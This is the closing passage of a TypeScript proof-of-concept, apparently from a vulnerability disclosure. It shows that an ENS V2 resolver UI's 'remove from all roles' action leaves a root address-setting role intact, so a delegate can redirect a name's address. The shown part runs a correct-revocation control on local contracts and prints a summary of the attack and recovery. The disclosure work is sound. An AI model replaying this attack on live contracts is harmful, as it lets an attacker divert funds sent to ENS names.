
// ---------------------------------------------------------------------------
// Negative control: revoke each original (resource, role) pair correctly.
// ---------------------------------------------------------------------------

const controlResolver = await deployResolver(CONTROL_SALT)
const CONTROL_DNS_NAME = dnsNameFor(controlResolver.address, CONTROL_NAME)
await ensV2.setupName({
  name: CONTROL_NAME,
  owner: ALICE,
  resolverAddress: controlResolver.address,
})
const controlInitialGrants = await seedMixedScopeState(
  controlResolver.address,
  CONTROL_NAME,
  CONTROL_NODE,
)

const controlResourceMap = buildResourceToNameMap([{ name: CONTROL_NAME }])
const controlNameResourceHex = [...controlResourceMap.entries()].find(
  ([, value]) => value === CONTROL_NAME,
)?.[0]
assert(controlNameResourceHex)
const controlNameResource = BigInt(controlNameResourceHex)

await writeAs(aliceWallet, controlResolver.address, 'revokeRootRoles', [
  resolverRoles.ROLE_SET_ADDR,
  MALLORY,
])
await writeAs(aliceWallet, controlResolver.address, 'authorizeNameRoles', [
  CONTROL_DNS_NAME,
  resolverRoles.ROLE_SET_TEXT,
  MALLORY,
  false,
])

assert.equal(
  await read<boolean>(controlResolver.address, 'hasRootRoles', [
    resolverRoles.ROLE_SET_ADDR,
    MALLORY,
  ]),
  false,
)
assert.equal(
  await read<boolean>(controlResolver.address, 'hasRoles', [
    controlNameResource,
    resolverRoles.ROLE_SET_ADDR,
    MALLORY,
  ]),
  false,
)

let controlAttackReverted = false
try {
  await writeAs(
    malloryWallet as typeof aliceWallet,
    controlResolver.address,
    'setAddr',
    [CONTROL_NODE, ATTACKER_DESTINATION],
  )
} catch {
  controlAttackReverted = true
}
assert.equal(controlAttackReverted, true)

const controlResolvedAddress = await read<Address>(
  controlResolver.address,
  'addr',
  [CONTROL_NODE],
)
assert.equal(controlResolvedAddress.toLowerCase(), SAFE_DESTINATION.toLowerCase())

const controlAddressLookupCalldata = encodeFunctionData({
  abi: permissionedResolverAbi,
  functionName: 'addr',
  args: [CONTROL_NODE],
})
const [controlUniversalAnswer, controlUniversalResolverAddress] =
  await ensV2.universalResolver.read.resolve([
    CONTROL_DNS_NAME,
    controlAddressLookupCalldata,
  ])
const controlUniversallyResolvedAddress = decodeFunctionResult({
  abi: permissionedResolverAbi,
  functionName: 'addr',
  data: controlUniversalAnswer,
}) as Address
assert.equal(
  controlUniversalResolverAddress.toLowerCase(),
  controlResolver.address.toLowerCase(),
)
assert.equal(
  controlUniversallyResolvedAddress.toLowerCase(),
  SAFE_DESTINATION.toLowerCase(),
)

console.log(
  JSON.stringify(
    {
      result:
        'PASS: address-record overwrite after advertised revocation reproduced end-to-end on local ENS V2 contracts',
      actors: {
        aliceOwner: ALICE,
        malloryDelegate: MALLORY,
        safeDestination: SAFE_DESTINATION,
        attackerDestination: ATTACKER_DESTINATION,
      },
      productionUi: {
        displayedScope: 'Global roles (all names)',
        confirmation:
          'Are you sure you want to remove this user from all roles? This action cannot be undone.',
        groupedNames: row.resolvedNames,
        groupedRoles: row.decodedRoles,
        selectedNameScope: roleName,
        encodedFunction: vulnerableDecoded.functionName,
        encodedAuthorizeFlag: vulnerableDecoded.args[3],
        initialRoleSetup: vulnerableInitialGrants,
      },
      vulnerablePath: {
        resolver: vulnerableResolver.address,
        removeTransaction: removeHash,
        removeStatus: removeReceipt.status,
        directNameRolesAfterRemoval: `0x${nameBitmapAfter.toString(16)}`,
        directRootRolesAfterRemoval: `0x${rootBitmapAfter.toString(16)}`,
        rootSetAddrStillEffective: authorityEffectiveOnVictim,
        malloryAttackTransaction: attackReceipt.transactionHash,
        finalResolvedAddress,
        universallyResolvedAddress,
      },
      recoveryAfterRefetch: {
        groupedNames: refreshedRow.resolvedNames,
        groupedRoles: refreshedRow.decodedRoles,
        selectedNameScope: recoveryRoleName,
        encodedFunction: recoveryDecoded.functionName,
        recoveryTransaction: recoveryReceipt.transactionHash,
        rootRolesAfterRecovery: '0x0',
        mallorySetAddrRevert: 'EACUnauthorizedAccountRoles',
        restoredAddress,
        restoredUniversalAddress,
      },
      correctRevocationControl: {
        resolver: controlResolver.address,
        initialRoleSetup: controlInitialGrants,
        mallorySetAddrReverted: controlAttackReverted,
        finalResolvedAddress: controlResolvedAddress,
        universallyResolvedAddress: controlUniversallyResolvedAddress,
      },
    },
    null,
    2,
  ),
)

```
